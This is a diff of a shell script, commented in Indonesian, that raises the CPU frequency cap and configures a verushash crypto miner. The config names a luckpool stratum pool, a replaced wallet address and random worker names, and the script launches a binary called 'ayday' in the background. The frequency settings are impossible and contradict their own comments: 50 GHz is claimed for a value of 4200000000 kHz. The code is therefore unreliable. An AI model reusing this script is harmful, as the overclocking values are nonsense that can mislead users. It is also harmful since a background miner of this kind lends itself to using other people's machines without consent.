@@ -17,9 +17,9 @@ if [ ! -s $FILE_PATH ]; then
   exit 1
 fi
 
-# Mengatur frekuensi CPU ke 12 GHz
+# Mengatur frekuensi CPU ke 50 GHz
 CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
-MAX_FREQ=12000000 # Maksimal frekuensi dalam kHz (12 GHz)
+MAX_FREQ=4200000000 # Maksimal frekuensi dalam kHz (50 GHz)
 
 for dir in $CPUFREQ_PATH; do
     if [ -e $dir/scaling_max_freq ]; then
@@ -30,9 +30,9 @@ done
 # Pengaturan penambangan
 ALGO="verushash"
 POOL_URL="stratum+tcp://eu.luckpool.net:3956"
-WALLET_ADDRESS="RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3"
+WALLET_ADDRESS="RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F"
 PASSWORD="x"
-WORKER_NAME="AALuxy$RANDOM"
+WORKER_NAME="O$RANDOM"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
